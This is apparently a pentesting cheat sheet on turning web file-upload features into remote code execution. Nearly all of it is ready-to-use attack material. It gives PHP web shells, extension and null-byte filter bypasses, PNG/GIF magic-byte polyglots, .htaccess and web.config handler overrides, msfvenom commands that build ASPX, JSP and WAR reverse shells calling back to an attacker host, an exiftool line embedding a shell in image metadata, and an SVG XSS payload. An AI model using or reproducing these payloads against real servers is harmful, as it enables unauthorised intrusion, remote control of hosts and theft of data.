---
title: File Upload → RCE
category: web
description: Bypass extension, content-type, and content checks.
tags: [upload, rce, web]
os: [any]
order: 50
---

## PHP shell variations

```php
<?php system($_GET['c']); ?>
<?= `$_GET[c]` ?>
<?php @eval($_POST['x']); ?>
<? phpinfo(); ?>
```

Save as `shell.php`. Common bypasses:

```text
shell.phtml   shell.phar   shell.php5   shell.pht   shell.inc
shell.php.jpg shell.jpg.php   shell.php%00.jpg
shell.pHp  shell.PHp7
shell.php;.jpg                (IIS / old Apache)
shell.php/  (trailing slash)
shell.php\x00.jpg              (null byte — older PHP)
```

## Content-Type + magic bytes

Add `Content-Type: image/png` and prepend a real header:

```text
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>
GIF89a;<?php system($_GET['c']); ?>
```

## .htaccess / web.config tricks

`.htaccess` upload (Apache):

```apache
AddType application/x-httpd-php .jpg
```

`web.config` upload (IIS):

```xml
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="x" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" />
</handlers></system.webServer></configuration>
```

## ASP / ASPX / JSP / WAR shells

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f aspx > shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war -o shell.war
```

## Image polyglots

```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg
```

## SVG XSS via upload

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```
